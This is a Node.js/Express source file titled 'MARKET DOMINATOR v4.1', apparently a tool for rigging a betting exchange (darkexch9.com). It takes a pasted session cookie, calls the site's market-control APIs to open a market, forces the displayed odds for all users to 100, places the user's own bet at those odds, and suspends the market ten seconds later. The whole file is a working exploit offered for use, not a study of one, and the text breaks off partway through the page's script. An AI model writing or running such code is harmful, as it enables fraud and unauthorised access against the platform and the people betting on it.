const axios = require('axios');
const express = require('express');
const app = express();

async function globalInjection(amt, cookie, tid, sid, rate, customUrl, isBack) {
    const headers = { 'Cookie': cookie, 'Content-Type': 'application/json' };
    const betApi = customUrl || "https://darkexch9.com/api/Exchange/PlaceBet";
    const priceApi = "https://darkexch9.com/api/Exchange/UpdateMarketPrice"; 
    const statusApi = "https://darkexch9.com/api/Exchange/SetMarketStatus";

    try {
        // 1. SABKE LIYE MARKET OPEN KARO
        await axios.post(statusApi, { "marketId": tid, "status": "OPEN" }, { headers });

        // 2. GLOBAL BHAO 100 KARO (Visible to everyone)
        await axios.post(priceApi, { "marketId": tid, "selectionId": sid, "lastPrice": rate || "100" }, { headers });
        
        // 3. APNI BET TURANT PLACE KARO
        const payload = { "marketId": tid, "selectionId": sid, "odds": rate || "100", "stake": amt, "isBack": isBack === "true" };
        const res = await axios.post(betApi, payload, { headers });

        // 4. THEEK 10 SECOND BAAD AUTO-SUSPEND (Lockdown)
        setTimeout(async () => {
            await axios.post(statusApi, { "marketId": tid, "status": "SUSPENDED" }, { headers });
            console.log("Global Lock Engaged at 10s");
        }, 10000); // 10000ms = 10 Seconds

        return "🔥 GLOBAL 100 ODDS INJECTED! (10s Timer Started)";
    } catch (e) { return "⚠️ Error: " + e.message; }
}

app.get('/', (req, res) => {
    res.send(`
    <html><body style="background:#000;color:#f00;text-align:center;font-family:sans-serif;padding:20px;">
        <h1 style="text-shadow:0 0 15px #f00;">⚡ MARKET DOMINATOR v4.1 ⚡</h1>
        <div style="border:3px solid #f00;padding:20px;display:inline-block;background:#111;border-radius:15px;text-align:left;box-shadow: 0 0 30px #900;">
            <p style="color:#666;font-size:12px;text-transform:uppercase;letter-spacing:1px;">Global Cookie Access</p>
            <input type="text" id="c" placeholder="Paste Fresh Cookie..." style="width:100%;padding:12px;margin-bottom:15px;background:#222;color:#fff;border:1px solid #f00;border-radius:5px;">
            
            <div style="display:flex;gap:10px;margin-bottom:15px;">
                <input type="text" id="m" placeholder="Market ID" style="padding:12px;width:50%;background:#222;color:#fff;border:1px solid #333;">
                <input type="text" id="sid" placeholder="Selection ID" style="padding:12px;width:50%;background:#222;color:#fff;border:1px solid #333;">
            </div>

            <div style="display:flex;gap:10px;margin-bottom:20px;">
                <input type="number" id="r" value="100" style="padding:12px;width:50%;background:#222;color:#0f0;font-weight:bold;border:1px solid #333;">
                <input type="number" id="a" placeholder="Stake Amount" style="padding:12px;width:50%;background:#222;color:#fff;border:1px solid #333;">
            </div>

            <div style="margin-bottom:20px; background:#1a1a1a; padding:10px; border:1px solid #444; border-radius:5px; text-align:center;">
                <span style="color:#888; font-size:12px;">AUTO-LOCK TIMER: <b style="color:#f00;">10 SECONDS</b></span>
            </div>

            <button onclick="f()" style="width:100%;padding:20px;background:linear-gradient(#f00, #400);color:#fff;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;box-shadow: 0 5px 15px rgba(255,0,0,0.4);">🚀 EXECUTE GLOBAL INJECTION</button>
        </div>
        <h3 id="s" style="color:#0f0;margin-top:20px;font-family:monospace;"></h3>
        <script>
            function f() {
                document.getElementById('s').innerText = "Infecting Market Servers...";
                let url = '/fire?amt='+document.getElementById('a').value +
                          '&cookie='+encodeURIComponent(document.getElementById('c').value) +
                          '&tid='+document.getElementById('m').value +
                          '&sid='+document.getElementById('sid').value +
                          '&rate='+document.getElementById('r').value +
                          '&isBack=true';
                fetch(url).then(r => r.text()).then(t => { document.getElementById('s').innerText = t; });
